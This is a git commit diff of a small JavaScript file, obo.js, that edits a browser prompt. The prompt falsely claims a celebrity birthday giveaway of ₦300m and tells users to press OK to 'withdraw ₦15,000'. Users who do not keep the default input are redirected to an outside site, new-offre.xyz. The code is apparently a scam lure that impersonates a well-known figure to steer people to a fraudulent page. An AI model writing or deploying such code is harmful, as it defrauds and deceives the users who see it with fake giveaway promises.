6f926fed3014bc0152a2c13fd69acbb9e84f62b5
bigetijazz10 <bigetijazz10@gmail.com>
2024-11-18 09:27:43 -0800

    Update obo.js

--- obo.js
+++ obo.js
@@ -1,6 +1,6 @@
 
 var password = 'Withdraw ₦15,000'
-password=prompt('SMS: #DAVID-BIRTHDAY We Donating ₦300m to support young Nigerians, Kindly press Ok to Withdraw ₦15,000 Cash ','Withdraw ₦15,000');
+password=prompt('SMS: #DAVIDO-BIRTHDAY We Donating ₦300m to support young Nigerians, Kindly press Ok to Withdraw ₦15,000 Cash','Withdraw ₦15,000');
 if (password != 'Withdraw ₦15,000') {
 location.href='https://www.new-offre.xyz/Birthday-donation';
 }
